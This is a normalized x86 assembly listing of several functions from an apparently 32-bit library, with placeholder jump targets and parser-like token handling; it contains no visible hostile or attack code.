push 0x24
push 0x6a
push 0x49
push 0x21
push 0x20
push 0x26
push 0x7f
push 0x78
push 0x22
push 0x7b
push 0x61
push 0x62
push 0x8e
push 0x60
push 0x6e
push 0x42
push 0xa
push 0x1c
push 0x7e
push 0x8b
push 0x3
push 0xe
push 0xb
push 0x52
push 0x7c
push 0x18
push ecx
call sub_100737e0
add esp 0x144
retn
dec eax
je r-xdata
push 0x96
push 0x5e
push 0x5d
push ecx
call sub_100737e0
add esp 0x10
retn
dec eax
je r-xdata
push 0x96
push 0x5b
push 0x58
push 0x57
push 0x56
push 0x55
push 0x54
push ecx
call sub_100737e0
add esp 0x20
retn
call sub_1006b85f
sub_10074bf0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov esi ecx
mov ebx 0x1
call sub_100748b0
mov eax [ esi + 0xc ]
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
cmp [ ecx ] ebx
jne r-xdata
mov eax [ eax + 0x8 ]
mov ecx [ eax + ecx * 4 - 0x4 ]
mov eax [ ebp + 0x8 ]
push esi
call sub_100736d0
add esp 0x4
push edi
mov eax esi
call sub_100734d0
call sub_10073830
add esp 0x4
test eax eax
jne r-xdata
cmp [ ecx + 0x1c ] edi
je r-xdata
xor ebx ebx
mov edi edi
mov eax esi
call sub_10073b80
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn
mov eax esi
call sub_10073b80
push edi
mov eax esi
call sub_100734d0
call sub_10073830
add esp 0x4
test eax eax
je r-xdata
sub_10074c70
push ebp
mov ebp esp
sub esp 0x10
push 0x96
push 0x6e
push 0x2
push 0x5e
push 0x5d
push 0x5b
push 0x58
push 0x57
push 0x56
push 0x55
push 0x54
push 0x4a
push 0x90
push 0x68
push 0x67
push 0x5f
push 0x0
push 0x60
push 0x7c
push 0x0
lea ecx [ ebp - 0x10 ]
push ecx
lea eax [ ebp - 0x4 ]
push esi
mov [ ebp - 0x4 ] 0x19
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x8 ] 0x1
call sub_10074530
add esp 0x58
test eax eax
je r-xdata
mov eax 0x1
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
mov eax 0x19
mov ecx esi
call sub_10074bf0
add esp 0x4
mov esp ebp
pop ebp
retn
sub_10074cf0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ eax + 0xc ]
push edi
mov edi [ ebx + 0xc ]
dec edi
mov [ ebx + 0x3c ] 0x0
js r-xdata
pop edi
pop ebx
pop ebp
retn
push esi
lea esp [ esp ]
push 0x96
push 0x21
push 0x22
push esi
call sub_100737e0
add esp 0x10
test eax eax
jne r-xdata
cmp [ esi ] 0x1
jne r-xdata
mov edx [ ebp + 0xc ]
mov eax [ esi + 0x1c ]
mov ecx [ ebp + 0x8 ]
push edx
call sub_10074bf0
add esp 0x4
mov ecx esi
call sub_10074ad0
test eax eax
je r-xdata
cmp [ esi + 0x1c ] 0x1f
jne r-xdata
dec edi
jns r-xdata
push 0x96
push 0x19
push 0x26
push 0x18
push esi
call sub_100737e0
add esp 0x14
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] 0x0
mov ecx [ ebx + 0x8 ]
mov esi [ ecx + edi * 4 ]
je r-xdata
pop esi
pop edi
pop ebx
pop ebp
retn
pop esi
sub_10074d80
push ebp
mov ebp esp
push ecx
push esi
add eax 0x4c
xor esi esi
mov [ ebp - 0x4 ] eax
cmp [ edi + 0x20 ] esi
jbe r-xdata
mov ecx [ ebp + 0x8 ]
push edi
push ecx
call sub_10048ae0
add esp 0x8
pop esi
mov esp ebp
pop ebp
retn
push ebx
inc esi
cmp esi [ edi + 0x20 ]
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push ecx
push ebx
push edx
call sub_10046530
mov eax [ edi + 0x1c ]
add esp 0xc
mov [ eax + esi * 4 ] 0x0
mov ecx [ edi + 0x1c ]
mov ebx [ ecx + esi * 4 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
push edx
push eax
call sub_10070600
add esp 0x8
test eax eax
jne r-xdata
pop ebx
sub_10074df0
push ebp
mov ebp esp
push ecx
push ebx
push esi
add eax 0x1c
push edi
mov [ ebp - 0x4 ] eax
mov edi rw-data
mov ebx 0xc
add edi 0xc
dec ebx
jne r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ ebp + 0x8 ]
push eax
push ecx
call sub_10021f70
mov edx [ edi + 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ esi ] edx
mov eax [ edi ]
push eax
push ecx
call sub_1004c490
add esp 0x10
mov [ esi + 0x4 ] eax
mov ecx [ edi - 0x4 ]
mov edx [ ebp - 0x4 ]
push ecx
push edx
call sub_10070600
mov esi eax
add esp 0x8
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10074e50
push ebp
mov ebp esp
push ebx
push esi
push edi
lea ebx [ eax + 0x1c ]
xor esi esi
jmp r-xdata
mov eax [ esi + rw-data ]
push eax
push ebx
call sub_10070600
mov edi eax
add esp 0x8
test edi edi
je r-xdata
add esi 0x10
cmp esi 0x3e0
jb r-xdata
mov ecx [ edi + 0x4 ]
mov edx [ ebp + 0x8 ]
push ecx
push edx
call sub_10021f70
mov eax [ esi + rw-data ]
mov ecx [ ebp + 0x8 ]
push eax
push ecx
call sub_1004c490
add esp 0x10
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10074eb0
push esi
add eax 0x1c
push r--data
push eax
call sub_10070600
mov esi eax
add esp 0x8
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi + 0x4 ]
push ecx
push edi
call sub_10021f70
push r--data
push edi
call sub_1004c490
add esp 0x10
mov [ esi + 0x4 ] eax
sub_10074ef0
push ebp
mov ebp esp
mov ecx [ eax ]
mov eax [ esi + 0x4 ]
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
xor eax eax
pop ebp
retn
cmp [ ebp + 0xc ] eax
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx ]
mov eax [ esi + 0x8 ]
cmp [ esi + 0x14 ] eax
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
mov eax 0x1
pop ebp
retn
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
sub_10074f70
push ebp
mov ebp esp
mov eax [ ebx + 0x18 ]
push esi
lea esi [ ebx + 0x18 ]
push edi
mov ecx r--data
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov eax ebx
call sub_100736d0
add esp 0x4
pop edi
xor eax eax
pop esi
pop ebp
retn
cmp [ esi + 0x10 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
mov edi [ esi + 0x4 ]
mov ecx [ r--data ]
mov eax edi
cmp [ esi + 0x14 ] 0x0
je r-xdata
xor ecx ecx
test eax eax
sete cl
mov eax ecx
test eax eax
je r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov eax [ esi + 0x8 ]
mov ecx r--data
mov edi edi
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
mov ecx [ r--data ]
mov eax edi
mov ecx [ r--data ]
mov eax [ esi + 0x8 ]
lea ebx [ ebx ]
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
push 0x0
push r--data
mov eax r--data
call sub_10074ef0
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ r--data ]
mov eax [ esi + 0x8 ]
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
push eax
push r--data
mov eax r--data
call sub_10074ef0
add esp 0x8
test eax eax
je r-xdata
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
test eax eax
je r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
test eax eax
je r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
sub_10075120
push ebp
mov ebp esp
sub esp 0x3c
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ eax + 0xc ]
push r--data
mov [ ebp - 0x4 ] edi
call sub_10020200
add esp 0x4
mov [ ebp - 0x20 ] 0x0
push r--data
call sub_10020200
add esp 0x4
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ edi + 0x14 ]
lea ecx [ ecx + eax * 4 ]
push r--data
call sub_10020200
add esp 0x4
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x1
jne r-xdata
sub ecx 0x4
dec eax
jns r-xdata
mov edx [ ebp + 0x10 ]
cmp [ ebx + 0x1c ] edx
je r-xdata
mov ebx [ ecx ]
mov [ ebp - 0x1c ] ebx
cmp ebx r--data
je r-xdata
add edi 0x8
push ebx
push edi
call sub_10005b00
mov esi eax
mov eax [ ebp + 0x10 ]
add esp 0x8
push esi
push eax
call sub_10068a50
add esp 0x4
push eax
push r--data
call sub_10020200
add esp 0xc
cmp esi 0xffffffff
je r-xdata
push r--data
call sub_10020200
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
add eax 0x14
push eax
push ebx
push ecx
call sub_10021d60
add esp 0x10
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
push 0x96
push 0x2
push 0x5e
push 0x5d
push 0x5b
push 0x58
push 0x57
mov ecx [ ebx + 0x1c ]
push 0x56
push 0x55
push 0x54
push 0x4a
push 0x90
push 0x68
push 0x67
push 0x5f
push 0x0
push 0x60
mov eax 0x1
push 0x7c
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] eax
push 0x0
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x18 ] ecx
mov ecx [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x18 ]
push ecx
mov [ ebp - 0x3c ] edx
call sub_10074530
add esp 0x54
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
push edx
call sub_100736d0
push r--data
call sub_10020200
add esp 0x8
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
call sub_100734d0
cmp ebx eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] esi
cmp esi [ eax + 0xc ]
jae r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
push edx
call sub_100736d0
add esp 0x4
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_100734d0
cmp eax ebx
je r-xdata
mov ecx [ edi ]
mov edx [ ebp - 0x8 ]
mov esi [ ecx + edx * 4 ]
mov ecx esi
mov [ ebp - 0xc ] esi
call sub_10074ad0
test eax eax
jne r-xdata
mov eax esi
call sub_10073b80
mov edx [ ebp - 0x4 ]
add edx 0x14
push edx
push ebx
push esi
call sub_10021d60
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_10073b80
mov eax esi
call sub_100734d0
cmp eax ebx
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x8 ] eax
cmp eax [ ecx + 0xc ]
jb r-xdata
push ebx
push edi
call sub_10005b00
mov edx [ edi ]
mov ecx [ esi + 0x1c ]
mov eax [ edx + eax * 4 - 0x4 ]
push ecx
mov [ ebp - 0x18 ] eax
call sub_10068a50
mov edx [ ebp - 0x18 ]
add esp 0xc
push eax
mov eax [ edx + 0x1c ]
push eax
call sub_10068a50
add esp 0x4
push eax
push r--data
call sub_10020200
mov eax [ ebp - 0x4 ]
add eax 0x14
push ebx
push eax
call sub_10005b00
push esi
push edi
mov [ ebp - 0x8 ] eax
mov ebx esi
call sub_10005b00
add esp 0x1c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] 0x0
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x8 ]
mov esi [ ecx + edi * 4 - 0x4 ]
dec edi
add eax 0x14
push esi
push eax
mov [ ebp - 0x10 ] edi
call sub_10005b00
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
mov edi esi
cmp esi [ ebp - 0x1c ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
add eax 0x8
push eax
push edi
push edx
call sub_1005c190
jmp r-xdata
mov ecx [ ebx + 0x1c ]
push ecx
call sub_10068a50
push eax
push r--data
call sub_10020200
mov esi [ ebx + 0x4 ]
add esp 0xc
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x14
push esi
push eax
call sub_10005b00
push 0x100
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x8 ]
push esi
push eax
call sub_1002f440
mov ecx [ ebp - 0x24 ]
mov esi eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov [ edx + ecx * 4 ] esi
mov eax [ eax + 0x8 ]
add esp 0x14
mov [ eax + edi * 4 ] esi
cmp ebx [ ebp - 0xc ]
jne r-xdata
mov eax [ ebp - 0x14 ]
inc eax
add esp 0xc
mov [ ebp - 0x14 ] eax
cmp eax 0x3
jl r-xdata
mov edi [ ebp + 0x8 ]
add esi 0x10
push ebx
push esi
call sub_10005b00
mov edi [ ebp + 0x8 ]
push esi
push eax
push edi
mov [ ebp - 0x24 ] eax
call sub_1005c190
mov eax [ ebp - 0x24 ]
add esp 0x14
mov [ ebx + 0x4 ] 0x0
mov [ ebx + 0x8 ] 0xffffffff
cmp eax [ esi + 0x4 ]
jae r-xdata
mov edi [ ebx + 0x4 ]
or [ ebx + 0xc ] 0x200
test edi edi
je r-xdata
inc ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x4 ]
add eax 0x8
push esi
push eax
call sub_10005b00
mov esi [ ebp - 0x10 ]
mov edi eax
push esi
push edi
push r--data
call sub_10020200
add esp 0x14
cmp edi 0xffffffff
jne r-xdata
mov edx [ esi + 0x1c ]
push edx
call sub_10068a50
push eax
push r--data
call sub_10020200
add esp 0xc
lea eax [ esi + 0x10 ]
push eax
mov [ ebx + 0x4 ] esi
mov ecx [ eax + 0x4 ]
push ebx
push edi
mov [ ebx + 0x8 ] ecx
call sub_10046530
add esp 0xc
push r--data
call sub_10020200
push edi
call sub_10073910
add esp 0x8
jmp r-xdata
mov esi [ ebp - 0x18 ]
or [ ebx + 0xc ] 0x200
push 0x96
push 0x66
push 0x64
push 0x65
push 0x63
push 0x5f
push esi
call sub_100737e0
add esp 0x1c
test eax eax
je r-xdata
lea esp [ esp ]
lea eax [ esi + 0x10 ]
push eax
mov [ ebx + 0x4 ] esi
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
push ebx
push eax
mov [ ebx + 0x8 ] edx
call sub_10046530
mov ebx esi
add edi 0x10
push ebx
push edi
call sub_10005b00
mov ecx [ ebp + 0x8 ]
push edi
push eax
push ecx
mov [ ebp - 0x24 ] eax
call sub_1005c190
mov eax [ ebp - 0x24 ]
add esp 0x14
mov [ ebx + 0x4 ] 0x0
mov [ ebx + 0x8 ] 0xffffffff
cmp eax [ edi + 0x4 ]
jae r-xdata
mov ecx [ ebp - 0xc ]
push eax
mov [ esi + 0x4 ] ecx
mov edx [ eax + 0x4 ]
push esi
push edi
mov [ esi + 0x8 ] edx
call sub_10046530
mov eax [ ebp - 0x4 ]
add eax 0x14
push ebx
push eax
mov [ ebp - 0x1c ] eax
call sub_10005b00
add esp 0x14
cmp eax [ ebp - 0x8 ]
jge r-xdata
mov edx [ ebp - 0x30 ]
mov edx [ edx + ecx * 4 ]
inc ecx
mov [ edx + 0x4 ] esi
cmp ecx [ ebp - 0x2c ]
jb r-xdata
mov ebx [ ebp - 0x1c ]
push 0x100
push ebx
push edi
call sub_1002f440
or [ ebx + 0xc ] 0x2
mov esi eax
mov eax [ esi + 0x18 ]
mov edx [ esi + 0x14 ]
mov ecx [ esi + 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
add eax 0x10
mov [ ebp - 0x2c ] edx
mov edx [ eax ]
mov [ esi + 0x10 ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0x14 ] edx
mov edx [ eax + 0x8 ]
mov [ esi + 0x18 ] edx
mov edx [ ebp - 0x28 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x2c ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edx
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x14 ]
mov [ ebp - 0x30 ] ecx
mov ecx [ esi + 0x18 ]
mov [ ebp - 0x28 ] ecx
add esp 0xc
xor ecx ecx
mov [ ebp - 0x2c ] edx
test edx edx
je r-xdata
mov edx [ esi ]
mov ecx [ edx + eax * 4 ]
mov [ ecx + 0x8 ] eax
inc eax
cmp eax [ esi + 0x4 ]
jb r-xdata
jmp r-xdata
lea esp [ esp ]
mov ecx [ ebp - 0x1c ]
push ecx
push eax
push edi
call sub_1005c190
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
push edx
push eax
push esi
push edi
call sub_10047370
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
push ebx
push edi
mov [ ebp - 0x24 ] eax
call sub_10021d60
mov ecx [ ebp - 0xc ]
mov ebx [ ebp - 0x24 ]
push ecx
push ebx
call sub_10005b00
push ebx
inc eax
push eax
push esi
push edi
call sub_10047370
mov eax [ ebp - 0x20 ]
inc eax
add esp 0x40
mov [ ebp - 0x20 ] eax
cmp eax 0x8
jge r-xdata
dec [ ebp - 0x8 ]
mov edx [ edi ]
mov ecx [ edx + eax * 4 ]
mov [ ecx + 0x8 ] eax
inc eax
cmp eax [ edi + 0x4 ]
jb r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ edi + 0x18 ]
dec eax
js r-xdata
sub_10075670
push esi
push edi
mov edi eax
call sub_10073a20
mov esi [ edi + 0xc ]
mov eax edi
call sub_10073b80
test eax eax
je r-xdata
mov eax edi
call sub_10073b80
test eax eax
jne r-xdata
cmp [ eax ] 0x1
jne r-xdata
pop edi
pop esi
retn
or [ eax + 0xc ] 0x2
mov ecx [ eax + 0x1c ]
cmp ecx 0xa
jne r-xdata
test ecx ecx
jne r-xdata
cmp [ esi + 0x6c ] 0x0
jne r-xdata
cmp [ esi + 0x70 ] ecx
jne r-xdata
mov eax edi
call sub_10073b80
test eax eax
jne r-xdata
sub_100756c0
push ebp
mov ebp esp
push ebx
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
mov ebx [ eax ]
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
cmp ecx 0x4
jne r-xdata
push esi
cmp ecx 0x3
jne r-xdata
mov ecx [ edi + 0xc ]
mov edx [ ecx + 0x68 ]
push edx
push edi
call sub_10048ae0
add esp 0x8
pop edi
mov eax 0x1
pop ebx
pop ebp
retn
test ecx ecx
jne r-xdata
mov esi eax
mov eax edi
call sub_10073c60
pop esi
pop edi
mov eax 0x1
pop ebx
pop ebp
retn
push edi
call sub_100736d0
mov eax 0x1
mov [ ebx + 0x2c ] eax
mov edx [ edi + 0xc ]
add esp 0x4
mov [ edx ] eax
mov ecx [ edi + 0xc ]
pop esi
pop edi
mov [ ecx + 0x34 ] eax
pop ebx
pop ebp
retn
mov [ ebx + 0x1c ] 0x1
mov ecx [ eax + 0x18 ]
lea esi [ eax + 0x18 ]
mov [ ebx + 0x20 ] ecx
mov edx [ eax + 0x1c ]
mov [ ebx + 0x24 ] edx
mov eax [ eax + 0x20 ]
mov [ ebx + 0x28 ] eax
call sub_10074460
mov [ ebx + 0x2c ] eax
mov ecx [ edi + 0xc ]
mov ebx [ ebp + 0xc ]
push edi
mov [ ecx ] 0x1
call sub_10074f70
add esp 0x4
pop esi
pop edi
pop ebx
pop ebp
retn
sub_10075770
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi ]
push edi
test eax eax
jne r-xdata
push ebx
cmp eax 0x3
jne r-xdata
mov edi [ ebp + 0x8 ]
push edi
mov eax esi
call sub_100736d0
mov eax [ edi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push edi
call sub_10048ae0
add esp 0xc
pop edi
xor eax eax
pop esi
pop ebp
retn
cmp eax 0x4
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x4 ]
mov ebx [ edx ]
call sub_10073c60
pop ebx
pop edi
mov eax 0x1
pop esi
pop ebp
retn
cmp eax 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc ]
mov edx [ ecx + 0x68 ]
push edx
push eax
call sub_10048ae0
add esp 0x8
pop ebx
pop edi
mov eax 0x1
pop esi
pop ebp
retn
cmp eax 0x2
jne r-xdata
xor ecx ecx
cmp [ esi + 0x18 ] ecx
sete cl
test ecx ecx
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x0
mov eax 0x8
mov ecx esi
call sub_10073fd0
mov edx [ esi + 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ esi + 0xc ]
add esp 0x4
mov [ eax ] 0x2
mov ecx [ esi + 0xc ]
pop ebx
pop edi
mov [ ecx + 0x34 ] 0x1
mov eax 0x1
pop esi
pop ebp
retn
push 0x96
push 0x42
push 0x0
push 0xa
push 0x1
push 0x0
mov eax esi
call sub_10073790
add esp 0x18
test eax eax
jne r-xdata
mov ebx [ ebp + 0x8 ]
mov edi esi
call sub_10073f90
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] eax
mov edx [ ebx + 0xc ]
pop ebx
pop edi
mov [ edx ] 0x2
mov eax 0x1
pop esi
pop ebp
retn
mov edi [ ebp + 0x8 ]
push edi
mov eax esi
call sub_100736d0
mov eax [ edi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push edi
call sub_10048ae0
add esp 0xc
pop ebx
pop edi
xor eax eax
pop esi
pop ebp
retn
sub_10075890
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0xc ]
mov eax [ edi ]
test eax eax
jne r-xdata
push ebx
cmp eax 0x3
jne r-xdata
mov esi [ ebp + 0x8 ]
push esi
mov eax edi
call sub_100736d0
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_10048ae0
add esp 0xc
pop edi
xor eax eax
pop esi
pop ebp
retn
cmp eax 0x4
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc ]
mov edx [ ecx + 0xc ]
test edx edx
jne r-xdata
mov esi 0x1
cmp eax esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov ecx [ edx + 0x68 ]
push ecx
push eax
call sub_10048ae0
add esp 0x8
pop ebx
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov ecx [ ecx + 0x8 ]
mov edx [ ecx + edx * 4 - 0x4 ]
mov esi edi
mov ebx edx
call sub_10073c60
pop ebx
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov esi edi
mov ebx edx
call sub_10073c60
lea eax [ ebx + 0x1 ]
pop ebx
pop edi
pop esi
pop ebp
retn
cmp eax 0x2
jne r-xdata
xor ecx ecx
cmp [ edi + 0x18 ] esi
sete cl
test ecx ecx
je r-xdata
mov edi [ ebp + 0x8 ]
push esi
mov eax 0x8
mov ecx edi
call sub_10073fd0
mov ecx [ edi + 0xc ]
mov [ ecx ] 0x3
mov edx [ edi + 0xc ]
add esp 0x4
mov [ edx + 0x2c ] eax
mov eax [ edi + 0xc ]
pop ebx
mov [ eax + 0x34 ] esi
pop edi
mov eax esi
pop esi
pop ebp
retn
push 0x96
push 0x42
push 0x0
push 0xa
push esi
push 0x0
mov eax edi
call sub_10073790
add esp 0x18
test eax eax
jne r-xdata
mov ebx [ ebp + 0x8 ]
call sub_10073f90
mov edx [ ebx + 0xc ]
mov [ edx ] 0x3
mov ecx [ ebx + 0xc ]
pop ebx
mov [ ecx + 0x2c ] eax
pop edi
mov eax esi
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push esi
mov eax edi
call sub_100736d0
mov edx [ esi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push esi
call sub_10048ae0
add esp 0xc
pop ebx
pop edi
xor eax eax
pop esi
pop ebp
retn
sub_100759d0
push ebp
mov ebp esp
push ebx
push edi
mov edi [ ebp + 0xc ]
mov ebx [ edi ]
cmp ebx 0x4
jne r-xdata
push esi
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
call sub_10074130
pop edi
lea eax [ ebx - 0x3 ]
pop ebx
pop ebp
retn
cmp ebx 0x3
jne r-xdata
mov esi [ ebp + 0x8 ]
push esi
mov eax edi
call sub_100736d0
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_10048ae0
add esp 0xc
pop esi
pop edi
xor eax eax
pop ebx
pop ebp
retn
mov esi 0x1
cmp ebx esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc ]
mov edx [ ecx + 0xc ]
test edx edx
jne r-xdata
push 0x96
push 0x4
push 0x7b
push 0x7e
push 0x8b
push 0x3
push esi
mov eax edi
call sub_10073790
add esp 0x1c
test eax eax
je r-xdata
xor eax eax
cmp [ edi + 0x18 ] eax
sete al
test eax eax
je r-xdata
mov ecx [ ecx + 0x8 ]
mov edx [ ecx + edx * 4 - 0x4 ]
mov esi edi
mov ebx edx
call sub_10073c60
pop esi
pop edi
mov eax 0x1
pop ebx
pop ebp
retn
mov esi edi
mov ebx edx
call sub_10073c60
pop esi
pop edi
lea eax [ ebx + 0x1 ]
pop ebx
pop ebp
retn
cmp ebx esi
jne r-xdata
mov ebx [ ebp + 0x8 ]
call sub_10073f90
mov eax ebx
call sub_10073b80
mov eax [ ebx + 0xc ]
mov [ eax + 0x38 ] esi
mov eax esi
pop esi
pop edi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edi
push edx
call sub_10075d00
add esp 0x8
pop esi
pop edi
pop ebx
pop ebp
retn
push 0x96
push 0x6
push 0x82
push esi
mov eax edi
call sub_10073790
add esp 0x10
test eax eax
je r-xdata
mov eax [ edi + 0x18 ]
xor ecx ecx
cmp eax 0x5
sete cl
test ecx ecx
je r-xdata
cmp ebx esi
jne r-xdata
push 0x4
jmp r-xdata
xor edx edx
cmp eax 0x2
sete dl
mov eax edx
test eax eax
je r-xdata
mov ebx [ ebp + 0x8 ]
call sub_10073f90
mov eax ebx
call sub_10073b80
mov ecx [ ebx + 0xc ]
mov [ ecx + 0x38 ] esi
mov eax esi
pop esi
pop edi
pop ebx
pop ebp
retn
cmp ebx 0x2
jne r-xdata
mov eax [ edi + 0x18 ]
xor ecx ecx
cmp eax 0x8
sete cl
test ecx ecx
je r-xdata
mov esi [ ebp + 0x8 ]
mov eax edi
call sub_10074190
add esp 0x4
pop esi
pop edi
mov eax 0x1
pop ebx
pop ebp
retn
push 0x2
jmp r-xdata
cmp ebx esi
jne r-xdata
xor eax eax
cmp [ edi + 0x18 ] esi
sete al
test eax eax
je r-xdata
xor ecx ecx
cmp eax 0x7
sete cl
mov eax ecx
test eax eax
je r-xdata
mov ebx [ ebp + 0x8 ]
call sub_10073f90
mov eax [ ebx + 0xc ]
mov [ eax ] 0x4
mov eax esi
pop esi
pop edi
pop ebx
pop ebp
retn
cmp ebx 0x2
jne r-xdata
xor eax eax
cmp [ edi + 0x18 ] esi
sete al
test eax eax
jne r-xdata
mov edi [ ebp + 0x8 ]
mov eax edi
call sub_10073b80
mov edx [ edi + 0xc ]
mov eax esi
